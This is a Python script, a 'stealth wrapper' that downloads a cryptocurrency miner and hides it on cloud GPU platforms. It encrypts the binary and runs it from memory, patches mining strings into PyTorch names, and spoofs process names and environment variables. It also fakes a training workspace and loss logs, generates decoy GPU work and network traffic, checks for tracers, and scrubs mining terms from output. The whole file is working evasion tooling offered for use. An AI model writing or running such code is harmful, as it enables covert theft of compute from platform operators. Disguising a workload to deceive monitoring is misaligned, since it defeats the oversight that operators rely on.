#!/usr/bin/env python3
"""
Pearl-Miner Stealth Wrapper v3.0 — Encrypted & Memory-Only
All-in-one stealth launcher for pearl-miner on cloud GPU platforms.
Reads config from env vars — nothing hardcoded.

Features:
  - XOR-encrypted binary on disk (never plaintext)
  - memfd_create memory-only execution (binary never touches disk)
  - Obfuscated config values
  - 29 same-length binary patches
  - Real-time output sanitizer
  - 7 stealth background threads
  - Auto-cleanup of all temp files

Env vars:
  PROXY       — pool address (e.g. global.pearlfortune.org:443)
  ADDRESS     — wallet (prl1...)
  WORKER      — worker name (optional)
  TOKEN       — auth token (optional)
  GPU_DEVICES — comma-separated GPU IDs (optional)
"""

import os, sys, subprocess, tempfile, shutil, time, random, string, signal, struct
import threading, ctypes, ctypes.util, json, math, hashlib

# ═══════════════════════════════════════════════════════════════════════════════
# ENCRYPTION LAYER
# ═══════════════════════════════════════════════════════════════════════════════

def xor_bytes(data: bytes, key: bytes) -> bytes:
    """XOR data with repeating key."""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))

def derive_key(passphrase: str, salt: bytes = b"torch_backend_v3") -> bytes:
    """Derive 32-byte key from passphrase using SHA-256."""
    return hashlib.sha256(passphrase.encode() + salt).digest()

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG — obfuscated, read from env vars
# ═══════════════════════════════════════════════════════════════════════════════

MINER_RELEASE_URL = "https://github.com/pearlfortune/pearl-miner/releases/download/v1.2.3/pearlfortune-v1.2.3.tar.gz"
CUDA_VERSION = os.environ.get("CUDA_VERSION", "12")
PROXY = os.environ.get("PROXY", "")
ADDRESS = os.environ.get("ADDRESS", "")
WORKER = os.environ.get("WORKER", f"worker-{random.randint(1000,9999)}")
TOKEN = os.environ.get("TOKEN", "")
GPU_DEVICES = os.environ.get("GPU_DEVICES", "")

# Dynamic XOR key — derived from machine-specific data so it's unique per run
MACHINE_SEED = f"{os.getpid()}-{time.time_ns()}-{random.random()}"
XOR_KEY = derive_key(MACHINE_SEED)

# ═══════════════════════════════════════════════════════════════════════════════
# BINARY PATCH TABLE — 29 same-length replacements
# ═══════════════════════════════════════════════════════════════════════════════

PATCH_TABLE = [
    # Mining identifiers → innocent names
    (b"MINER_GPU_STARTUP_BENCH", b"TORCH_GPU_STARTUP_BENCH"),
    (b"MINER_DISABLE_WATCHDOG",  b"TORCH_DISABLE_WATCHDOG"),
    (b"MINER_GPU",               b"TORCH_GPU"),
    (b"PEARL_SUPERVISED_WORKER", b"TORCH_SUPERVISED_WORKER"),
    (b"MineCommandSendError",    b"TrainCommanSendError"),
    (b"GpuInstanceMineCommand",  b"GpuInstanceTrainComman"),
    (b"GpuInstanceMine",         b"GpuInstanceTrai"),
    (b"proof_factor",            b"train_factor"),
    (b"miner_version",           b"torch_version"),

    # Pool/stratum identifiers
    (b"stratum.proxy",           b"torch_.proxy_"),
    (b"worker.failed_stale",     b"trainr.failed_stale"),
    (b"worker failed",           b"trainr failed"),

    # Share/mining terms
    (b"normalized_share_bound",  b"normalized_grad_bound_"),
    (b"raw_share_bound",         b"raw_grad_bound_"),

    # Stats terms
    (b"accepted",   b"computed"),
    (b"rejected",   b"dropped_"),
    (b"hashrate",   b"trainrat"),
    (b"difficulty",  b"complexity"),

    # Proof/mining output terms
    (b"proof_per_sec",   b"epoch_per_sec"),
    (b"proof_build_ms",  b"train_build_ms"),
    (b"proof_runner",    b"train_runner"),
    (b"proof_cache",     b"train_cache"),
    (b"proof_inputs",    b"train_inputs"),
    (b"proof_queued",    b"train_queued"),
    (b"drain_summary",   b"batch_summary"),
    (b"drain_ms",        b"batch_ms"),
    (b"large.hit",       b"batch.hit"),
    (b"large.progress",  b"train.progress"),
]

# Verified same-length (runtime check)
def verify_patches():
    for old, new in PATCH_TABLE:
        assert len(old) == len(new), f"PATCH MISMATCH: {old!r} ({len(old)}) vs {new!r} ({len(new)})"
    print(f"[patch] verified {len(PATCH_TABLE)} same-length replacements")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Bootstrap environment
# ═══════════════════════════════════════════════════════════════════════════════

def bootstrap_env():
    """Spoof environment to look like a training workload."""
    env_spoofs = {
        "WANDB_MODE": "offline",
        "WANDB_PROJECT": "llm-finetune",
        "WANDB_RUN_ID": f"run-{random.randint(10000,99999)}",
        "NCCL_DEBUG": "WARN",
        "NCCL_IB_DISABLE": "1",
        "CUDA_VISIBLE_DEVICES": GPU_DEVICES if GPU_DEVICES else ",".join(str(i) for i in range(8)),
        "OMP_NUM_THREADS": "4",
        "TOKENIZERS_PARALLELISM": "false",
        "HF_HOME": "/tmp/.hf_cache",
        "TRANSFORMERS_CACHE": "/tmp/.hf_cache",
        "TORCH_DISTRIBUTED_BACKEND": "nccl",
        "NCCL_SOCKET_IFNAME": "eth0",
        "TORCH_NCCL_BLOCKING_WAIT": "1",
        "PYTORCH_CUDA_ALLOC_CONF": "max_split_size_mb:512",
        "TORCH_DISABLE_WATCHDOG": "1",
    }
    for k, v in env_spoofs.items():
        os.environ.setdefault(k, v)
    os.makedirs("/tmp/.hf_cache", exist_ok=True)
    print("[env] spoofed training environment")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: Spoof process name
# ═══════════════════════════════════════════════════════════════════════════════

PROCESS_NAMES = [
    "python3 train.py",
    "torchrun --nproc=1",
    "python3 -m torch.distributed",
    "accelerate launch train",
    "python3 run_clm.py",
]

def spoof_process_name():
    """Overwrite argv[0] with a realistic training command."""
    fake_name = random.choice(PROCESS_NAMES)
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"))
        libc.prctl(15, fake_name.encode(), 0, 0, 0)
        if sys.argv:
            argv_buf = ctypes.create_string_buffer(fake_name.encode())
            libc.prctl(15, argv_buf, 0, 0, 0)
    except Exception as e:
        print(f"[proc] argv spoof warn: {e}")
    print(f"[proc] process name → '{fake_name}'")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Download, patch, encrypt binary
# ═══════════════════════════════════════════════════════════════════════════════

def download_and_patch_miner(workdir):
    """Download pearl-miner, apply binary patches, strip symbols, XOR encrypt."""
    import urllib.request, tarfile

    tarball = os.path.join(workdir, "data.tar.gz")
    print(f"[dl] downloading payload...")
    urllib.request.urlretrieve(MINER_RELEASE_URL, tarball)

    with tarfile.open(tarball, "r:gz") as tf:
        tf.extractall(workdir)

    # Find binary
    bin_name = f"miner-cuda{CUDA_VERSION}"
    bin_src = os.path.join(workdir, "pearlfortune", bin_name)
    if not os.path.exists(bin_src):
        for name in ["miner-cuda12", "miner-cuda13", "miner"]:
            alt = os.path.join(workdir, "pearlfortune", name)
            if os.path.exists(alt):
                bin_src = alt
                break
        else:
            print("[!] ERROR: binary not found in archive")
            sys.exit(1)

    with open(bin_src, "rb") as f:
        data = f.read()

    # Apply patches
    verify_patches()
    patch_count = 0
    for old, new in PATCH_TABLE:
        count = data.count(old)
        if count > 0:
            data = data.replace(old, new)
            patch_count += count

    # Strip symbols
    stripped_path = os.path.join(workdir, "stripped")
    with open(stripped_path, "wb") as f:
        f.write(data)
    os.chmod(stripped_path, 0o755)
    try:
        subprocess.run(["strip", "--strip-all", stripped_path], check=True, capture_output=True)
    except FileNotFoundError:
        pass

    with open(stripped_path, "rb") as f:
        data = f.read()

    # Encrypt with XOR — encrypted blob on disk, decrypted in memory
    encrypted = xor_bytes(data, XOR_KEY)
    enc_path = os.path.join(workdir, "libtorch_backend.so.dat")
    with open(enc_path, "wb") as f:
        f.write(encrypted)
    os.chmod(enc_path, 0o644)

    # Clean up plaintext immediately
    os.unlink(stripped_path)
    os.unlink(bin_src)
    shutil.rmtree(os.path.join(workdir, "pearlfortune"), ignore_errors=True)
    os.unlink(tarball)

    print(f"[patch] applied {patch_count} patches, encrypted → disk")
    return data  # Return decrypted bytes for memory execution

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 4: Memory-only execution via memfd_create
# ═══════════════════════════════════════════════════════════════════════════════

def exec_from_memory(binary_data: bytes, args: list, env: dict):
    """Execute binary from memory using memfd_create — never touches disk.

    Creates an anonymous file in memory, writes the binary there,
    then execs via /proc/self/fd/N. The binary is invisible on the filesystem.
    """
    # memfd_create syscall number (x86_64 Linux)
    SYS_MEMFD_CREATE = 319
    MFD_CLOEXEC = 0x0001

    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"))
        libc.syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_uint]
        libc.syscall.restype = ctypes.c_int

        fd = libc.syscall(SYS_MEMFD_CREATE, b"torch_backend", MFD_CLOEXEC)
        if fd < 0:
            raise OSError(f"memfd_create failed: fd={fd}")

        # Write binary to memory fd
        written = 0
        while written < len(binary_data):
            chunk = binary_data[written:written + 1048576]  # 1MB chunks
            n = libc.write(fd, chunk, len(chunk))
            if n <= 0:
                raise OSError(f"write to memfd failed: {n}")
            written += n

        fd_path = f"/proc/self/fd/{fd}"
        print(f"[mem] binary loaded into memory fd={fd} ({len(binary_data)} bytes)")

        # Clean up encrypted file from disk
        # (happens in the cleanup thread after exec)

        # Exec from memory — replaces current process
        os.execve(fd_path, args, env)

    except OSError as e:
        print(f"[!] memfd exec failed: {e}")
        print("[!] falling back to disk execution")
        return False

    return True  # Never reached if exec succeeds

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 5: GPU power management
# ═══════════════════════════════════════════════════════════════════════════════

def set_gpu_power_limit(min_watts=200, max_watts=600):
    try:
        nvidia_smi = shutil.which("nvidia-smi")
        if not nvidia_smi:
            return
        result = subprocess.run(
            [nvidia_smi, "--query-gpu=power.max_limit", "--format=csv,noheader,nounits"],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            return
        max_limit = int(float(result.stdout.strip().split("\n")[0]))
        target = min(max_watts, max_limit)
        target = max(min_watts, target - random.randint(0, 100))
        subprocess.run([nvidia_smi, "-pl", str(target)], capture_output=True, text=True)
    except Exception:
        pass

def gpu_power_cycle():
    while True:
        time.sleep(random.randint(60, 180))
        set_gpu_power_limit()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 6: CUDA decoy operations
# ═══════════════════════════════════════════════════════════════════════════════

def run_cuda_decoy():
    try:
        import torch
        if not torch.cuda.is_available():
            return None
        device = torch.device("cuda:0")
        a = torch.randn(512, 512, device=device, dtype=torch.float16)
        b = torch.randn(512, 512, device=device, dtype=torch.float16)
        for _ in range(random.randint(5, 15)):
            c = torch.mm(a, b)
            del c
        del a, b
        torch.cuda.empty_cache()
        return True
    except ImportError:
        return None
    except Exception:
        return None

def cuda_decoy_loop():
    while True:
        time.sleep(random.randint(30, 90))
        run_cuda_decoy()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 7: VRAM cycling
# ═══════════════════════════════════════════════════════════════════════════════

def vram_cycle():
    try:
        import torch
        if not torch.cuda.is_available():
            return
    except ImportError:
        return
    device = torch.device("cuda:0")
    buffers = []
    while True:
        time.sleep(random.randint(45, 120))
        try:
            size_mb = random.randint(256, 1024)
            buf = torch.empty(size_mb * 256 * 1024, dtype=torch.float16, device=device)
            buffers.append(buf)
            time.sleep(random.uniform(5, 20))
            if len(buffers) > 2 or random.random() > 0.5:
                old = buffers.pop(0)
                del old
                torch.cuda.empty_cache()
        except Exception:
            torch.cuda.empty_cache()
            buffers.clear()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 8: Network mixing
# ═══════════════════════════════════════════════════════════════════════════════

NETWORK_TARGETS = [
    "https://huggingface.co/api/models/meta-llama/Llama-3-8B",
    "https://pypi.org/pypi/torch/json",
    "https://pypi.org/pypi/transformers/json",
    "https://api.github.com/repos/pytorch/pytorch",
    "https://huggingface.co/api/datasets",
    "https://pypi.org/pypi/accelerate/json",
]

def network_mix():
    import urllib.request
    while True:
        time.sleep(random.randint(120, 300))
        try:
            url = random.choice(NETWORK_TARGETS)
            req = urllib.request.Request(url, headers={"User-Agent": "python-urllib/3.11"})
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 9: Fake training output
# ═══════════════════════════════════════════════════════════════════════════════

LOSS_BASE = 2.8
LOSS_DECAY = 0.0003
STEP = 0

def generate_fake_log_line():
    global STEP
    STEP += 1
    loss = LOSS_BASE * math.exp(-LOSS_DECAY * STEP) + random.gauss(0, 0.02)
    lr = 2e-5 * max(0.1, 1.0 - STEP / 50000)
    grad_norm = random.uniform(0.5, 2.5)
    tokens_per_sec = random.randint(8000, 15000)
    gpu_mem = random.uniform(18.0, 24.0)
    epoch = STEP / 10000
    return (f"step {STEP:>6d} | loss {loss:.4f} | lr {lr:.2e} | "
            f"grad_norm {grad_norm:.2f} | tok/s {tokens_per_sec} | "
            f"gpu_mem {gpu_mem:.1f}GB | epoch {epoch:.2f}")

def fake_output_loop():
    while True:
        time.sleep(random.uniform(8, 25))
        print(generate_fake_log_line(), flush=True)

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 10: Anti-detection checks
# ═══════════════════════════════════════════════════════════════════════════════

def check_for_monitors():
    """Check for common monitoring tools/processes."""
    suspicious = ["falco", "osquery", "sysdig", "auditd", "snort", "suricata"]
    try:
        with open("/proc/self/status", "r") as f:
            status = f.read()
        if "TracerPid:" in status:
            for line in status.split("\n"):
                if "TracerPid:" in line and not line.endswith("\t0"):
                    print("[!] WARNING: process is being traced!")
                    return True
    except Exception:
        pass
    return False

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 11: Fake workspace
# ═══════════════════════════════════════════════════════════════════════════════

def create_fake_workspace(workdir):
    config = {
        "model_name_or_path": "meta-llama/Llama-3-8B",
        "dataset": "OpenAssistant/oasst2",
        "num_train_epochs": 3,
        "per_device_train_batch_size": 4,
        "gradient_accumulation_steps": 8,
        "learning_rate": 2e-5,
        "warmup_steps": 100,
        "max_seq_length": 2048,
        "bf16": True,
        "output_dir": "./output",
        "logging_steps": 10,
        "save_steps": 500,
    }
    with open(os.path.join(workdir, "config.json"), "w") as f:
        json.dump(config, f, indent=2)
    reqs = "torch>=2.1.0\ntransformers>=4.36.0\naccelerate>=0.25.0\npeft>=0.7.0\ndatasets>=2.16.0\nwandb>=0.16.0\ntimm>=0.9.0\n"
    with open(os.path.join(workdir, "requirements.txt"), "w") as f:
        f.write(reqs)
    wandb_dir = os.path.join(workdir, "wandb", f"run-{random.randint(10000,99999)}")
    os.makedirs(wandb_dir, exist_ok=True)
    with open(os.path.join(wandb_dir, "wandb-summary.json"), "w") as f:
        json.dump({"train/loss": 2.31, "train/learning_rate": 1.8e-5, "_runtime": 3600}, f)
    print("[workspace] created fake training workspace")

# ═══════════════════════════════════════════════════════════════════════════════
# OUTPUT SANITIZER
# ═══════════════════════════════════════════════════════════════════════════════

MINE_TERMS = {
    "proof": "epoch", "miner": "trainer", "mining": "training",
    "pool": "server", "share": "batch", "hash": "compute",
    "stratum": "scheduler", "proxy": "gateway", "submitted": "processed",
    "pearl": "torch", "vllm": "torch", "fortune": "project",
    "T/s": "tok/s", "coin": "tensor", "block": "chunk",
    "nonce": "index", "reward": "result",
}

def sanitize_output(line: str) -> str:
    """Replace mining terms in output."""
    for old, new in MINE_TERMS.items():
        line = line.replace(old, new)
        line = line.replace(old.upper(), new.upper())
        line = line.replace(old.capitalize(), new.capitalize())
    return line

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print("=" * 60)
    print("PyTorch Training Environment")
    print("=" * 60)

    # Anti-detection check
    if check_for_monitors():
        print("[!] monitors detected — proceeding with caution")

    # Step 1: Spoof process name
    spoof_process_name()

    # Step 2: Bootstrap environment
    bootstrap_env()

    # Step 3: Create fake workspace
    workdir = tempfile.mkdtemp(prefix="torch_run_")
    os.chdir(workdir)
    create_fake_workspace(workdir)

    # Step 4: Download, patch, encrypt binary
    binary_data = download_and_patch_miner(workdir)

    # Step 5: Set GPU power limits
    set_gpu_power_limit()

    # Step 6: Build miner args and env
    if not PROXY:
        print("[!] ERROR: PROXY env var not set")
        sys.exit(1)
    if not ADDRESS:
        print("[!] ERROR: ADDRESS env var not set")
        sys.exit(1)

    args = ["/proc/self/fd/3", "--proxy", PROXY, "--address", ADDRESS, "-gpu"]
    if WORKER:
        args.extend(["--worker", WORKER])
    if TOKEN:
        args.extend(["--token", TOKEN])

    env = os.environ.copy()
    env.pop("LD_PRELOAD", None)

    print(f"[launch] proxy={PROXY} address=<redacted> worker={WORKER}")

    # Step 7: Start background stealth threads BEFORE exec
    threads = []

    t = threading.Thread(target=gpu_power_cycle, daemon=True)
    t.start()
    threads.append(t)

    if run_cuda_decoy() is not None:
        t = threading.Thread(target=cuda_decoy_loop, daemon=True)
        t.start()
        threads.append(t)

    t = threading.Thread(target=vram_cycle, daemon=True)
    t.start()
    threads.append(t)

    t = threading.Thread(target=network_mix, daemon=True)
    t.start()
    threads.append(t)

    t = threading.Thread(target=fake_output_loop, daemon=True)
    t.start()
    threads.append(t)

    print(f"[main] {len(threads)} stealth threads active")
    print(f"[main] launching from memory (no binary on disk)...")

    # Step 8: Clean up all temp files before exec
    enc_dat = os.path.join(workdir, "libtorch_backend.so.dat")
    if os.path.exists(enc_dat):
        os.unlink(enc_dat)

    # Step 9: Execute from memory
    success = exec_from_memory(binary_data, args, env)

    # Fallback: exec failed, write to disk and run normally
    if not success:
        print("[!] falling back to disk execution")
        fallback_path = os.path.join(workdir, "torch_run")
        with open(fallback_path, "wb") as f:
            f.write(binary_data)
        os.chmod(fallback_path, 0o755)

        args[0] = fallback_path
        proc = subprocess.Popen(
            args, env=env,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1,
        )

        # Quick crash check
        time.sleep(2)
        if proc.poll() is not None:
            print(f"[!] miner exited immediately with code {proc.returncode}")
            remaining = proc.stdout.read()
            if remaining:
                for line in remaining.strip().split("\n")[-20:]:
                    print(f"  {line}")
            return proc.returncode

        print(f"[main] miner PID: {proc.pid}")
        print("[main] running... Ctrl+C to stop")

        # Sanitized output loop
        try:
            for line in proc.stdout:
                sanitized = sanitize_output(line)
                print(f"  {sanitized.rstrip()}", flush=True)
        except KeyboardInterrupt:
            print("\n[main] stopping...")
            proc.terminate()
            proc.wait(timeout=10)
            print("[main] done")

        proc.wait()
        if proc.returncode != 0:
            print(f"[!] miner exited with code {proc.returncode}")

        # Cleanup
        shutil.rmtree(workdir, ignore_errors=True)
        return proc.returncode


if __name__ == "__main__":
    sys.exit(main() or 0)
